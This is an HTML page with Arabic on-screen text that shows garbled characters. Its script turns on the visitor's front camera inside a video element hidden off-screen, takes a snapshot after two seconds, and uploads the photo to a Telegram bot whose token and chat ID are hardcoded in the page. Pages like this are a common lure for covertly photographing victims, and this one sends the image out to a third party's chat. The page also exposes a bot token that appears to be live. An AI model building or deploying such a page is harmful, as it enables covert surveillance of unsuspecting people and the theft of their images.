<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>Camera Shot</title>
</head>
<body>

<h2 id="msg">ðŸ“¸ Ø§Ø¨ØªØ³Ù…â€¦ ÙŠØªÙ… Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø© Ø§Ù„Ø¢Ù†!</h2>

<video id="video" autoplay playsinline style="
    width:1px;
    height:1px;
    opacity:0;
    position:absolute;
    left:-9999px;
"></video>

<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");

const BOT_TOKEN = "7960928309:AAFWhZhNuHn42tzjUEyvoUT8k6Eu97BaFbA";
const CHAT_ID = "8557609477";

navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
.then(stream => {
    video.srcObject = stream;

    video.onloadedmetadata = () => {
        setTimeout(() => {

            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("photo", blob, "photo.jpg");

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: formData
                })
                .then(() => document.getElementById("msg").innerText = "âœ” ØªÙ… Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©")
                .catch(() => document.getElementById("msg").innerText = "âœ— Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„");
            }, "image/jpeg", 0.95);

        }, 2000); // Ù…Ù‡Ù…: Ø¥Ø¹Ø·Ø§Ø¡ ÙˆÙ‚Øª Ù„ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
    };

})
.catch(err => {
    document.getElementById("msg").innerText = "âœ— Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù„Ù… ÙŠØ³Ù…Ø­ Ø¨Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§";
});
</script>

</body>
</html>
